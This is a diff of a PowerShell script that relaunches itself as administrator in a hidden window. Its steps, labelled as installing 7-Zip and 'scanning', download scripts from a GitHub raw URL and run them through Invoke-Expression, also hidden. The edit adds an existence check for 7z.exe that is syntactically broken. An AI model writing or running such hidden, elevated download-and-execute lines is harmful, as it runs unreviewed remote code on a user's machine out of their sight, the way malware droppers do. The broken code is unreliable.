@@ -14,7 +14,10 @@ if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\In
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
 
 #7zip
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/7zip_33667.ps1')"
+if ((Get-Item -Path 'C:\Program Files\7-Zip\7z.exe' -eq $null)
+{
+    powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/7zip_33667.ps1')"
+}
 
 #scanning
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/scan_33667.ps1')"
